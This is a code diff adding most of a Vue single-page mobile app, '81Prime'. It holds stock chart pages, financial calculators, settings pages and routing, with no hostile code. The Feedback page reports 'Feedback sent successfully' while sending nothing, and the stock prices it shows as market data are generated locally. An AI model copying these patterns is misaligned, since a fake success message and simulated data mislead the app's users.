+        const features = SELECTED_FEATURES;
+        const icons = {};
+        features.forEach(f => { icons[f.icon] = icon(f.icon, 22); });
+        // shuffle display order only
+        const shuffledStocks = Vue.ref([...STOCKS_WITH_CHANGE].sort(() => Math.random() - 0.5));
+        return { features, icons, shuffledStocks };
+      }
+    };
+
+    // ---- Stock Detail ----
+    const StockDetailPage = {
+      template: `
+        <div class="page-scroll no-tab">
+          <div class="page-header">
+            <button class="back-btn" @click="$router.back()" v-html="backIcon"></button>
+            <div class="page-title">{{ stock.symbol }}</div>
+          </div>
+
+          <div class="glass" style="padding:16px;">
+            <div class="detail-price-block">
+              <div class="detail-price">{{ stock.price.toFixed(2) }}</div>
+              <div class="detail-change" :class="stock.change >= 0 ? 'up' : 'down'">
+                {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
+              </div>
+              <div class="text-sm text-secondary mt-sm">{{ stock.name }}</div>
+            </div>
+
+            <div class="section-title">30-Day Price History</div>
+            <div class="chart-wrap">
+              <svg :viewBox="'0 0 ' + chartW + ' ' + chartH" preserveAspectRatio="none">
+                <defs>
+                  <linearGradient id="chartGrad" x1="0" y1="0" x2="0" y2="1">
+                    <stop offset="0%" stop-color="rgba(46,92,255,0.25)"/>
+                    <stop offset="100%" stop-color="rgba(46,92,255,0.01)"/>
+                  </linearGradient>
+                </defs>
+                <polygon :points="areaPoints" fill="url(#chartGrad)"/>
+                <polyline :points="linePoints" fill="none" stroke="#2e5cff" stroke-width="2" stroke-linejoin="round" stroke-linecap="round"/>
+              </svg>
+            </div>
+            <div class="flex-between text-xs text-secondary" style="padding:0 4px;">
+              <span>Day 1</span>
+              <span>Day 15</span>
+              <span>Day 30</span>
+            </div>
+          </div>
+        </div>
+      `,
+      setup() {
+        const route = VueRouter.useRoute();
+        const symbol = route.params.symbol;
+        const stock = STOCKS_WITH_CHANGE.find(s => s.symbol === symbol) || STOCKS_WITH_CHANGE[0];
+        const history = genHistory(stock.symbol, stock.price);
+
+        const chartW = 300;
+        const chartH = 180;
+        const padTop = 16;
+        const padBot = 16;
+        const min = Math.min(...history);
+        const max = Math.max(...history);
+        const range = max - min || 1;
+        const drawH = chartH - padTop - padBot;
+
+        const points = history.map((p, i) => {
+          const x = (i / (history.length - 1)) * chartW;
+          const y = padTop + (1 - (p - min) / range) * drawH;
+          return { x, y };
+        });
+
+        const linePoints = points.map(p => p.x.toFixed(1) + ',' + p.y.toFixed(1)).join(' ');
+        const areaPoints = '0,' + (chartH - padBot) + ' ' + linePoints + ' ' + chartW + ',' + (chartH - padBot);
+
+        return {
+          stock,
+          chartW,
+          chartH,
+          linePoints,
+          areaPoints,
+          backIcon: icon('arrow-left', 20),
+        };
+      }
+    };
+
+    // ---- Feature List Page ----
+    const FeatureListPage = {
+      template: `
+        <div class="page-scroll no-tab">
+          <div class="page-header">
+            <button class="back-btn" @click="$router.back()" v-html="backIcon"></button>
+            <div class="page-title">{{ title }}</div>
+          </div>
+
+          <div v-if="feature.id === 'guide'">
+            <div class="glass" style="padding:20px;">
+              <div class="article-title">Navigating Market Cycles with Confidence</div>
+              <div class="article-meta">81Prime Research · 5 min read</div>
+              <div class="article-body">
+                <p>Financial markets move in cycles—expansion, peak, contraction, and trough. Understanding where we are in the cycle helps investors make informed decisions rather than emotional ones.</p>
+                <p>During expansion phases, growth-oriented sectors like technology and consumer discretionary tend to outperform. As the cycle matures, value stocks and dividend payers often become more attractive for their stability.</p>
+                <p>Diversification across asset classes remains the most reliable strategy. A balanced portfolio that includes equities, fixed income, and alternative assets can weather different market conditions and reduce overall volatility.</p>
+                <p>Stay disciplined. Market timing is nearly impossible, but time in the market—combined with regular contributions and a long-term perspective—has historically rewarded patient investors.</p>
+              </div>
+            </div>
+          </div>
+
+          <div v-else>
+            <div v-for="s in listStocks" :key="s.symbol" class="stock-item" @click="$router.push('/stock/' + s.symbol)">
+              <div class="stock-left">
+                <div class="stock-symbol">{{ s.symbol }}</div>
+                <div class="stock-name">{{ s.name }}</div>
+              </div>
+              <div class="stock-right">
+                <div class="stock-price">{{ s.price.toFixed(2) }}</div>
+                <div class="stock-change" :class="s.change >= 0 ? 'up' : 'down'">
+                  {{ s.change >= 0 ? '+' : '' }}{{ s.change.toFixed(2) }}%
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      `,
+      setup() {
+        const route = VueRouter.useRoute();
+        const id = route.params.id;
+        const feature = ALL_FEATURES.find(f => f.id === id) || ALL_FEATURES[0];
+        const title = feature.label;
+
+        const listStocks = Vue.ref(
+          [...STOCKS_WITH_CHANGE].sort(() => Math.random() - 0.5).slice(0, feature.count || 10)
+        );
+
+        return {
+          feature,
+          title,
+          listStocks,
+          backIcon: icon('arrow-left', 20),
+        };
+      }
+    };
+
+    // ---- Toolbox ----
+    const ToolboxPage = {
+      template: `
+        <div class="page-scroll with-tab">
+          <div class="page-header">
+            <div class="page-title">Toolbox</div>
+          </div>
+
+          <!-- DCA Profit-Taking -->
+          <div class="tool-card">
+            <h3>DCA Profit-Taking</h3>
+            <div class="field-group">
+              <label class="field-label">Average Cost</label>
+              <input class="input-field" type="number" v-model.number="dca.cost" placeholder="0.00" step="0.01">
+            </div>
+            <div class="field-group">
+              <label class="field-label">Shares Held</label>
+              <input class="input-field" type="number" v-model.number="dca.shares" placeholder="0" step="1">
+            </div>
+            <div class="field-group">
+              <label class="field-label">Take-Profit Threshold (%)</label>
+              <input class="input-field" type="number" v-model.number="dca.threshold" placeholder="10" step="0.1">
+            </div>
+            <div class="tool-result">
+              <div>Current Value: <strong>{{ (dca.cost * dca.shares).toFixed(2) }}</strong></div>
+              <div>Take-Profit Price: <strong>{{ takeProfitPrice }}</strong></div>
+              <div>Target Value: <strong>{{ targetValue }}</strong></div>
+              <div :class="gain >= 0 ? 'up' : 'down'">
+                Potential Gain: <strong>{{ gain >= 0 ? '+' : '' }}{{ gain.toFixed(2) }}%</strong>
+              </div>
+            </div>
+          </div>
+
+          <!-- Wealth Calendar -->
+          <div class="tool-card">
+            <h3>Wealth Calendar</h3>
+            <div class="field-group">
+              <label class="field-label">Start Date</label>
+              <input class="input-field" type="date" v-model="cal.startDate">
+            </div>
+            <div class="field-group">
+              <label class="field-label">Term (months)</label>
+              <input class="input-field" type="number" v-model.number="cal.term" placeholder="12" min="1">
+            </div>
+            <div class="field-group">
+              <label class="field-label">Maturity Date (auto)</label>
+              <input class="input-field" type="date" v-model="cal.maturityDate" readonly>
+            </div>
+            <div class="tool-result" v-if="cal.maturityDate">
+              Days until maturity: <strong>{{ daysToMaturity }}</strong>
+            </div>
+          </div>
+
+          <!-- Loan Calculator -->
+          <div class="tool-card">
+            <h3>Loan Calculator</h3>
+            <div class="field-group">
+              <label class="field-label">Loan Amount</label>
+              <input class="input-field" type="number" v-model.number="loan.amount" placeholder="100000">
+            </div>
+            <div class="field-group">
+              <label class="field-label">Annual Interest Rate (%)</label>
+              <input class="input-field" type="number" v-model.number="loan.rate" placeholder="4.5" step="0.01">
+            </div>
+            <div class="field-group">
+              <label class="field-label">Term (years)</label>
+              <input class="input-field" type="number" v-model.number="loan.years" placeholder="20" min="1">
+            </div>
+            <div class="tool-result">
+              <div>Monthly Payment (Equal Installment): <strong>{{ monthlyPayment }}</strong></div>
+              <div>Total Payment: <strong>{{ totalPayment }}</strong></div>
+              <div>Total Interest: <strong>{{ totalInterest }}</strong></div>
+            </div>
+          </div>
+
+          <!-- Profit Calculator -->
+          <div class="tool-card">
+            <h3>Profit Calculator</h3>
+            <div class="field-group">
+              <label class="field-label">Unit Cost</label>
+              <input class="input-field" type="number" v-model.number="profit.cost" placeholder="0.00" step="0.01">
+            </div>
+            <div class="field-group">
+              <label class="field-label">Unit Price</label>
+              <input class="input-field" type="number" v-model.number="profit.price" placeholder="0.00" step="0.01">
+            </div>
+            <div class="field-group">
+              <label class="field-label">Units Sold</label>
+              <input class="input-field" type="number" v-model.number="profit.units" placeholder="0">
+            </div>
+            <div class="tool-result">
+              <div>Revenue: <strong>{{ revenue }}</strong></div>
+              <div>Total Cost: <strong>{{ totalCost }}</strong></div>
+              <div :class="profitVal >= 0 ? 'up' : 'down'">
+                Profit: <strong>{{ profitVal >= 0 ? '+' : '' }}{{ profitVal.toFixed(2) }}</strong>
+              </div>
+            </div>
+          </div>
+
+          <!-- Reverse Yield -->
+          <div class="tool-card">
+            <h3>Reverse Yield</h3>
+            <div class="field-group">
+              <label class="field-label">Target Profit</label>
+              <input class="input-field" type="number" v-model.number="rev.target" placeholder="0.00" step="0.01">
+            </div>
+            <div class="field-group">
+              <label class="field-label">Principal</label>
+              <input class="input-field" type="number" v-model.number="rev.principal" placeholder="0.00" step="0.01">
+            </div>
+            <div class="field-group">
+              <label class="field-label">Duration (years)</label>
+              <input class="input-field" type="number" v-model.number="rev.years" placeholder="1" step="0.1" min="0.1">
+            </div>
+            <div class="tool-result">
+              Required Annualized Return: <strong>{{ annualizedReturn }}</strong>
+            </div>
+          </div>
+
+          <!-- Password Strength -->
+          <div class="tool-card">
+            <h3>Password Strength</h3>
+            <div class="field-group">
+              <label class="field-label">Enter Password</label>
+              <input class="input-field" type="password" v-model="pwd.input" placeholder="Type a password...">
+            </div>
+            <div class="tool-result">
+              <div>Strength: <strong :style="{color: pwd.color}">{{ pwd.label }}</strong></div>
+              <div>MD5 Digest: <strong style="font-size:12px;word-break:break-all;">{{ pwd.md5 }}</strong></div>
+            </div>
+          </div>
+
+          <!-- Credit Memo -->
+          <div class="tool-card">
+            <h3>Credit Memo</h3>
+            <div class="field-group">
+              <label class="field-label">Creditor Name</label>
+              <input class="input-field" v-model="memo.name" placeholder="Name">
+            </div>
+            <div class="field-group">
+              <label class="field-label">Amount</label>
+              <input class="input-field" type="number" v-model.number="memo.amount" placeholder="0.00" step="0.01">
+            </div>
+            <div class="field-group">
+              <label class="field-label">Due Date</label>
+              <input class="input-field" type="date" v-model="memo.dueDate">
+            </div>
+            <button class="btn" style="width:100%;" @click="saveMemo">Save Memo</button>
+            <div v-if="memos.length" class="tool-result mt">
+              <div v-for="(m, i) in memos" :key="i" style="margin-bottom:6px;">
+                {{ m.name }} — {{ m.amount }} — Due in <strong>{{ m.daysLeft }}</strong> days
+              </div>
+            </div>
+          </div>
+        </div>
+      `,
+      setup() {
+        // DCA
+        const dca = Vue.reactive({ cost: 100, shares: 10, threshold: 20 });
+        const takeProfitPrice = Vue.computed(() => (dca.cost * (1 + dca.threshold / 100)).toFixed(2));
+        const targetValue = Vue.computed(() => (dca.cost * (1 + dca.threshold / 100) * dca.shares).toFixed(2));
+        const gain = Vue.computed(() => dca.threshold);
+
+        // Calendar
+        const cal = Vue.reactive({ startDate: '', term: 12, maturityDate: '' });
+        Vue.watch(() => [cal.startDate, cal.term], () => {
+          if (cal.startDate) {
+            const d = new Date(cal.startDate);
+            d.setMonth(d.getMonth() + (cal.term || 0));
+            cal.maturityDate = d.toISOString().slice(0, 10);
+          }
+        });
+        const daysToMaturity = Vue.computed(() => {
+          if (!cal.maturityDate) return '—';
+          const diff = new Date(cal.maturityDate) - new Date();
+          return Math.max(0, Math.ceil(diff / 86400000));
+        });
+
+        // Loan
+        const loan = Vue.reactive({ amount: 100000, rate: 4.5, years: 20 });
+        const monthlyPayment = Vue.computed(() => {
+          const r = loan.rate / 100 / 12;
+          const n = loan.years * 12;
+          if (r === 0) return (loan.amount / n).toFixed(2);
+          const p = loan.amount * r * Math.pow(1 + r, n) / (Math.pow(1 + r, n) - 1);
+          return p.toFixed(2);
+        });
+        const totalPayment = Vue.computed(() => (parseFloat(monthlyPayment.value) * loan.years * 12).toFixed(2));
+        const totalInterest = Vue.computed(() => (parseFloat(totalPayment.value) - loan.amount).toFixed(2));
+
+        // Profit
+        const profit = Vue.reactive({ cost: 10, price: 15, units: 100 });
+        const revenue = Vue.computed(() => (profit.price * profit.units).toFixed(2));
+        const totalCost = Vue.computed(() => (profit.cost * profit.units).toFixed(2));
+        const profitVal = Vue.computed(() => profit.price * profit.units - profit.cost * profit.units);
+
+        // Reverse Yield
+        const rev = Vue.reactive({ target: 1000, principal: 10000, years: 1 });
+        const annualizedReturn = Vue.computed(() => {
+          if (!rev.principal || !rev.years) return '—';
+          const r = (Math.pow(1 + rev.target / rev.principal, 1 / rev.years) - 1) * 100;
+          return r.toFixed(2) + '%';
+        });
+
+        // Password
+        const pwd = Vue.reactive({ input: '' });
+        const pwdComputed = Vue.computed(() => {
+          const v = pwd.input;
+          if (!v) return { label: '—', color: '#999', md5: '—' };
+          const digest = md5(v);
+          let score = 0;
+          if (v.length >= 8) score++;
+          if (v.length >= 12) score++;
+          if (/[a-z]/.test(v) && /[A-Z]/.test(v)) score++;
+          if (/\d/.test(v)) score++;
+          if (/[^a-zA-Z0-9]/.test(v)) score++;
+          if (score <= 2) return { label: 'Weak', color: '#e8503a', md5: digest };
+          if (score <= 3) return { label: 'Fair', color: '#f0a030', md5: digest };
+          return { label: 'Strong', color: '#1e9e6a', md5: digest };
+        });
+        Vue.watchEffect(() => { pwd.label = pwdComputed.value.label; pwd.color = pwdComputed.value.color; pwd.md5 = pwdComputed.value.md5; });
+
+        // Credit Memo
+        const memo = Vue.reactive({ name: '', amount: 0, dueDate: '' });
+        const memos = Vue.ref([]);
+        function saveMemo() {
+          if (!memo.name || !memo.dueDate) return;
+          const diff = Math.ceil((new Date(memo.dueDate) - new Date()) / 86400000);
+          memos.value.push({ name: memo.name, amount: memo.amount, dueDate: memo.dueDate, daysLeft: Math.max(0, diff) });
+          if (typeof Notification !== 'undefined' && Notification.permission === 'granted') {
+            new Notification('Credit Reminder', { body: `${memo.name} — ${memo.amount}` });
+          } else if (typeof Notification !== 'undefined' && Notification.permission !== 'denied') {
+            Notification.requestPermission();
+          }
+          memo.name = ''; memo.amount = 0; memo.dueDate = '';
+        }
+
+        return {
+          dca, takeProfitPrice, targetValue, gain,
+          cal, daysToMaturity,
+          loan, monthlyPayment, totalPayment, totalInterest,
+          profit, revenue, totalCost, profitVal,
+          rev, annualizedReturn,
+          pwd,
+          memo, memos, saveMemo,
+        };
+      }
+    };
+
+    // ---- Settings ----
+    const SettingsPage = {
+      template: `
+        <div class="page-scroll with-tab">
+          <div class="page-header">
+            <div class="page-title">Settings</div>
+          </div>
+
+          <div class="settings-list">
+            <button class="settings-item" @click="$router.push('/settings/version')">
+              <span>Version</span>
+              <span class="flex-between gap-sm"><span class="text-sm text-secondary">1.0.0</span> <span v-html="chevron"></span></span>
+            </button>
+            <button class="settings-item" @click="$router.push('/settings/privacy')">
+              <span>Privacy Policy</span>
+              <span v-html="chevron"></span>
+            </button>
+            <button class="settings-item" @click="$router.push('/settings/terms')">
+              <span>Terms of Service</span>
+              <span v-html="chevron"></span>
+            </button>
+            <button class="settings-item" @click="$router.push('/settings/team')">
+              <span>About Team</span>
+              <span v-html="chevron"></span>
+            </button>
+            <button class="settings-item" @click="contactUs">
+              <span>Contact Us</span>
+              <span v-html="chevron"></span>
+            </button>
+            <button class="settings-item" @click="$router.push('/settings/checkin')">
+              <span>Monthly Check-in</span>
+              <span v-html="chevron"></span>
+            </button>
+            <button class="settings-item" @click="$router.push('/settings/feedback')">
+              <span>Feedback</span>
+              <span v-html="chevron"></span>
+            </button>
+            <button class="settings-item" @click="$router.push('/settings/inbox')">
+              <span>Inbox</span>
+              <span v-html="chevron"></span>
+            </button>
+          </div>
+        </div>
+      `,
+      setup() {
+        function contactUs() {
+          window.location.href = 'mailto:com.text.counter.app@gmail.com';
+        }
+        return { chevron: icon('chevron-right', 18), contactUs };
+      }
+    };
+
+    // ---- Settings Sub Pages ----
+    const VersionPage = {
+      template: `
+        <div class="page-scroll no-tab">
+          <div class="page-header">
+            <button class="back-btn" @click="$router.back()" v-html="backIcon"></button>
+            <div class="page-title">Version</div>
+          </div>
+          <div class="glass" style="padding:24px;text-align:center;">
+            <div style="font-size:48px;font-weight:800;color:var(--primary);">1.0.0</div>
+            <div class="text-secondary mt-sm">81Prime Mobile</div>
+            <div class="text-xs text-secondary mt-sm">Bundle ID: com.text.counter.app</div>
+          </div>
+        </div>
+      `,
+      setup() { return { backIcon: icon('arrow-left', 20) }; }
+    };
+
+    const PrivacyPage = {
+      template: `
+        <div class="page-scroll no-tab">
+          <div class="page-header">
+            <button class="back-btn" @click="$router.back()" v-html="backIcon"></button>
+            <div class="page-title">Privacy Policy</div>
+          </div>
+          <div class="glass" style="padding:20px;">
+            <div class="article-body">
+              <p>81Prime ("we", "our", or "us") is committed to protecting your privacy. This Privacy Policy explains how we collect, use, and safeguard your information when you use our mobile application.</p>
+              <p><strong>Information We Collect:</strong> We may collect device identifiers and usage data to improve our services. We do not sell your personal information to third parties.</p>
+              <p><strong>How We Use Your Information:</strong> Your data is used solely to provide and enhance the app experience, including market data display and tool functionality.</p>
+              <p><strong>Data Security:</strong> We implement industry-standard security measures to protect your information. However, no method of transmission over the Internet is 100% secure.</p>
+              <p><strong>Changes to This Policy:</strong> We may update this Privacy Policy from time to time. Continued use of the app constitutes acceptance of any changes.</p>
+              <p>If you have questions, contact us at com.text.counter.app@gmail.com.</p>
+            </div>
+          </div>
+        </div>
+      `,
+      setup() { return { backIcon: icon('arrow-left', 20) }; }
+    };
+
+    const TermsPage = {
+      template: `
+        <div class="page-scroll no-tab">
+          <div class="page-header">
+            <button class="back-btn" @click="$router.back()" v-html="backIcon"></button>
+            <div class="page-title">Terms of Service</div>
+          </div>
+          <div class="glass" style="padding:20px;">
+            <div class="article-body">
+              <p>By using 81Prime, you agree to these Terms of Service. Please read them carefully.</p>
+              <p><strong>Use of Service:</strong> 81Prime provides financial information and tools for informational purposes only. It does not constitute financial advice.</p>
+              <p><strong>User Responsibilities:</strong> You are responsible for maintaining the confidentiality of any account information and for all activities that occur under your account.</p>
+              <p><strong>Limitation of Liability:</strong> 81Prime shall not be liable for any indirect, incidental, or consequential damages arising from your use of the service.</p>
+              <p><strong>Governing Law:</strong> These terms are governed by the laws applicable in your jurisdiction.</p>
+              <p>We reserve the right to modify these terms at any time. Continued use constitutes acceptance.</p>
+            </div>
+          </div>
+        </div>
+      `,
+      setup() { return { backIcon: icon('arrow-left', 20) }; }
+    };
+
+    const TeamPage = {
+      template: `
+        <div class="page-scroll no-tab">
+          <div class="page-header">
+            <button class="back-btn" @click="$router.back()" v-html="backIcon"></button>
+            <div class="page-title">About Team</div>
+          </div>
+          <div class="glass" style="padding:20px;">
+            <div style="text-align:center;margin-bottom:20px;">
+              <div style="width:72px;height:72px;border-radius:50%;background:linear-gradient(135deg,var(--primary),#7a9bff);display:flex;align-items:center;justify-content:center;margin:0 auto 12px;">
+                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+              </div>
+              <div style="font-size:20px;font-weight:700;">81Prime Team</div>
+            </div>
+            <div class="article-body">
+              <p>We are a dedicated group of financial technology enthusiasts committed to making market data accessible and understandable for everyone.</p>
+              <p>Our mission is to empower individual investors with professional-grade tools and insights, delivered through a clean and intuitive mobile experience.</p>
+              <p>Based across multiple time zones, our team brings together expertise in finance, data analytics, and mobile engineering.</p>
+            </div>
+          </div>
+        </div>
+      `,
+      setup() { return { backIcon: icon('arrow-left', 20) }; }
+    };
+
+    const CheckinPage = {
+      template: `
+        <div class="page-scroll no-tab">
+          <div class="page-header">
+            <button class="back-btn" @click="$router.back()" v-html="backIcon"></button>
+            <div class="page-title">Monthly Check-in</div>
+          </div>
+
+          <div class="glass" style="padding:20px;">
+            <div style="text-align:center;font-size:18px;font-weight:700;margin-bottom:12px;">
+              {{ monthName }} {{ year }}
+            </div>
+
+            <div class="calendar-grid">
+              <div v-for="d in dayHeaders" :key="'h'+d" class="cal-header">{{ d }}</div>
+              <div v-for="(cell, idx) in calendarCells" :key="idx"
+                   class="cal-day"
+                   :class="{ 'empty': !cell.day, 'today': cell.isToday, 'checked': cell.checked }">
+                <span v-if="cell.day">{{ cell.day }}</span>
+                <div v-if="cell.checked" class="cal-dot"></div>
+              </div>
+            </div>
+
+            <button class="btn" style="width:100%;margin-top:16px;" @click="doCheckin" :disabled="todayChecked">
+              {{ todayChecked ? 'Checked In Today' : 'Check In Today' }}
+            </button>
+          </div>
+        </div>
+      `,
+      setup() {
+        const backIcon = icon('arrow-left', 20);
+        const now = new Date();
+        const year = now.getFullYear();
+        const month = now.getMonth();
+        const monthName = now.toLocaleString('en', { month: 'long' });
+        const dayHeaders = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
+
+        const STORAGE_KEY = '81prime_checkins';
+        const checkedDays = Vue.ref([]);
+        try {
+          const raw = localStorage.getItem(STORAGE_KEY);
+          if (raw) checkedDays.value = JSON.parse(raw);
+        } catch (e) {}
+
+        const todayStr = year + '-' + (month + 1) + '-' + now.getDate();
+        const todayChecked = Vue.computed(() => checkedDays.value.includes(todayStr));
+
+        const firstDay = new Date(year, month, 1).getDay();
+        const daysInMonth = new Date(year, month + 1, 0).getDate();
+        const cells = [];
+        for (let i = 0; i < firstDay; i++) cells.push({ day: 0 });
+        for (let d = 1; d <= daysInMonth; d++) {
+          const ds = year + '-' + (month + 1) + '-' + d;
+          cells.push({
+            day: d,
+            isToday: d === now.getDate(),
+            checked: checkedDays.value.includes(ds),
+          });
+        }
+        const calendarCells = Vue.ref(cells);
+
+        function doCheckin() {
+          if (todayChecked.value) return;
+          checkedDays.value.push(todayStr);
+          try { localStorage.setItem(STORAGE_KEY, JSON.stringify(checkedDays.value)); } catch (e) {}
+          calendarCells.value = calendarCells.value.map(c =>
+            c.day === now.getDate() ? { ...c, checked: true } : c
+          );
+        }
+
+        return { backIcon, monthName, year, dayHeaders, calendarCells, todayChecked, doCheckin };
+      }
+    };
+
+    const FeedbackPage = {
+      template: `
+        <div class="page-scroll no-tab">
+          <div class="page-header">
+            <button class="back-btn" @click="$router.back()" v-html="backIcon"></button>
+            <div class="page-title">Feedback</div>
+          </div>
+
+          <div class="glass" style="padding:20px;">
+            <div class="field-group">
+              <label class="field-label">Title</label>
+              <input class="input-field" v-model="title" placeholder="Brief summary">
+            </div>
+            <div class="field-group">
+              <label class="field-label">Content</label>
+              <textarea class="input-field" v-model="content" placeholder="Describe your feedback..." rows="5"></textarea>
+            </div>
+            <button class="btn" style="width:100%;" :disabled="!canSend" @click="send">Send</button>
+          </div>
+        </div>
+      `,
+      setup() {
+        const router = VueRouter.useRouter();
+        const title = Vue.ref('');
+        const content = Vue.ref('');
+        const canSend = Vue.computed(() => title.value.trim() && content.value.trim());
+
+        function send() {
+          if (!canSend.value) return;
+          const app = document.querySelector('#app').__vue_app__;
+          const root = app._instance.proxy;
+          if (root && root.showToast) root.showToast('Feedback sent successfully');
+          title.value = '';
+          content.value = '';
+          setTimeout(() => router.back(), 600);
+        }
+
+        return { backIcon: icon('arrow-left', 20), title, content, canSend, send };
+      }
+    };
+
+    const InboxPage = {
+      template: `
+        <div class="page-scroll no-tab">
+          <div class="page-header">
+            <button class="back-btn" @click="$router.back()" v-html="backIcon"></button>
+            <div class="page-title">Inbox</div>
+          </div>
+
+          <div class="settings-list">
+            <button v-for="(msg, i) in messages" :key="i" class="settings-item" @click="openMsg(msg)">
+              <span>{{ msg.title }}</span>
+              <span v-html="chevron"></span>
+            </button>
+          </div>
+
+          <div v-if="activeMsg" class="modal-overlay" @click.self="activeMsg = null">
+            <div class="modal-content">
+              <h3>{{ activeMsg.title }}</h3>
+              <p>{{ activeMsg.body }}</p>
+              <button class="btn" style="width:100%;margin-top:16px;" @click="activeMsg = null">Close</button>
+            </div>
+          </div>
+        </div>
+      `,
+      setup() {
+        const messages = [
+          { title: 'Welcome', body: 'Welcome to 81Prime! We are excited to have you on board. Explore market data, use our financial tools, and stay informed with the latest insights. If you need any assistance, feel free to reach out via the Feedback section.' },
+        ];
+        const activeMsg = Vue.ref(null);
+        function openMsg(msg) { activeMsg.value = msg; }
+        return { backIcon: icon('arrow-left', 20), chevron: icon('chevron-right', 18), messages, activeMsg, openMsg };
+      }
+    };
+
+    // ==================== 3. ROUTER ====================
+    const routes = [
+      { path: '/', redirect: '/loading' },
+      { path: '/loading', component: LoadingPage, meta: { noTab: true } },
+      { path: '/home', component: HomePage, meta: { tab: true } },
+      { path: '/stock/:symbol', component: StockDetailPage, meta: { noTab: true } },
+      { path: '/feature/:id', component: FeatureListPage, meta: { noTab: true } },
+      { path: '/toolbox', component: ToolboxPage, meta: { tab: true } },
+      { path: '/settings', component: SettingsPage, meta: { tab: true } },
+      { path: '/settings/version', component: VersionPage, meta: { noTab: true } },
+      { path: '/settings/privacy', component: PrivacyPage, meta: { noTab: true } },
+      { path: '/settings/terms', component: TermsPage, meta: { noTab: true } },
+      { path: '/settings/team', component: TeamPage, meta: { noTab: true } },
+      { path: '/settings/checkin', component: CheckinPage, meta: { noTab: true } },
+      { path: '/settings/feedback', component: FeedbackPage, meta: { noTab: true } },
+      { path: '/settings/inbox', component: InboxPage, meta: { noTab: true } },
+    ];
+
+    const router = VueRouter.createRouter({
+      history: VueRouter.createWebHashHistory(),
+      routes,
+    });
+
+    // ==================== 4. ROOT APP ====================
+    const App = {
+      template: `
+        <router-view v-slot="{ Component }">
+          <transition name="fade-slide" mode="out-in">
+            <component :is="Component" />
+          </transition>
+        </router-view>
+
+        <!-- Tab bar -->
+        <nav class="tab-bar" v-if="showTab">
+          <router-link to="/home" class="tab-item" :class="{ active: isActive('/home') }">
+            <svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+            <span>Home</span>
+          </router-link>
+          <router-link to="/toolbox" class="tab-item" :class="{ active: isActive('/toolbox') }">
+            <svg viewBox="0 0 24 24"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>
+            <span>Toolbox</span>
+          </router-link>
+          <router-link to="/settings" class="tab-item" :class="{ active: isActive('/settings') }">
+            <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
+            <span>Settings</span>
+          </router-link>
+        </nav>
+
+        <transition name="fade-slide">
+          <div v-if="toastMsg" class="toast">{{ toastMsg }}</div>
+        </transition>
+      `,
+      setup() {
+        const route = VueRouter.useRoute();
+        const showTab = Vue.computed(() => {
+          const path = route.path;
+          if (path === '/loading') return false;
+          if (path.startsWith('/stock/') || path.startsWith('/feature/')) return false;
+          if (path.startsWith('/settings/') && path !== '/settings') return false;
+          return route.meta.tab === true;
+        });
+
+        const isActive = (prefix) => route.path === prefix || route.path.startsWith(prefix + '/');
+
+        const toastMsg = Vue.ref('');
+        let toastTimer = null;
+        function showToast(msg) {
+          toastMsg.value = msg;
+          if (toastTimer) clearTimeout(toastTimer);
+          toastTimer = setTimeout(() => { toastMsg.value = ''; }, 2000);
+        }
+
+        return { showTab, isActive, toastMsg, showToast };
+      }
+    };
+
+    const app = Vue.createApp(App);
+    app.use(router);
+    const vm = app.mount('#app');
+
+    // Expose showToast to child components
+    vm.showToast = function (msg) {
+      const instance = app._instance;
+      if (instance && instance.proxy) {
+        // Access the root setup's showToast
+        const root = instance.proxy;
+        if (root.toastMsg !== undefined) {
+          root.toastMsg = msg;
+          setTimeout(() => { root.toastMsg = ''; }, 2000);
+        }
+      }
+    };
+  </script>
+</body>
+</html>
